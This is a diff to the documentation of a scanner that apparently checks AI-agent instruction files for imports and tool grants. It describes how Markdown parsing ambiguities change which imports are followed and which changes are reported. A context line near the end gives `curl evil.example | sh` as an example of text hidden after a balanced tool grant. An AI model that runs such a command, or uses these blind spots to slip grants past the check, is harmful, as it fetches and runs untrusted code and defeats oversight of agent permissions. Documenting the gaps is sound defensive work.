@@ -1115,10 +1115,17 @@ A way around a limit that its entry does not describe is worth a
   resolved from that file's directory. The imports of other instruction files, such
   as `AGENTS.md` or a rule file, are followed only when a memory file imports them.
   Imports are read from the text outside fenced code and code spans as CommonMark
-  reads it, across lines and inside block quotes and list items. Where CommonMark
-  readers disagree, as after a link reference definition or inside raw HTML, the
-  text is searched as written, so more is looked up; a host that reads Markdown
-  otherwise, such as with GitHub's table or autolink extensions, can still import a
+  reads it, across lines and inside block quotes and list items. When the only
+  disagreement is the start of an HTML block, the scanner follows imports from
+  either complete reading. For example, cmark-gfm 0.29 parses the line after
+  `<search>notes</search>` as prose when there is no intervening blank line.
+  A closing code span there can expose an import. Readers that treat `search`
+  as a block tag keep the same line in raw HTML. A fenced example that both
+  readers recognize stays an example. Other ambiguities, including footnotes followed by a setext heading
+  underline, also retain the raw text and container and inline-code boundaries.
+  In that case a fenced example such as `@../notes.md` can count as an import and
+  cause `scan --check` to fail.
+  A host using GitHub's table or autolink extensions can still import a
   file from text read here as code.
   A reference is read only where `@` starts the text or follows white space, and
   without the sentence punctuation after it. A host that also starts a reference
@@ -1505,6 +1512,13 @@ A way around a limit that its entry does not describe is worth a
   wrong checkout, gives 0 changes and exit 0, unless a file missing from it held tool
   grants or limits in `BASE_TREE`. Check `files_scanned.head` in the JSON report, or
   `across N head file(s)` in the text one, before trusting a clean result.
+  In ambiguous Markdown the container reading can strip indentation, so an added
+  indented code example can register as a change.
+  The diff compares prose separately from raw HTML, so a blank line that moves
+  a previously illustrated reference into prose can register as a new import.
+  A closing span can expose an import whose filename contains literal backticks.
+  Other paired spans keep their contents as code. Backticks inside a raw HTML
+  block shared by the readers do not introduce an inline-code boundary.
 - **An inline tool grant ends at its balanced parenthesis.** Text after it is prose,
   so `Bash(git status) && curl evil.example | sh)` records `Bash(git status)`, and
   changing what follows raises nothing. A grant whose parentheses do not balance runs
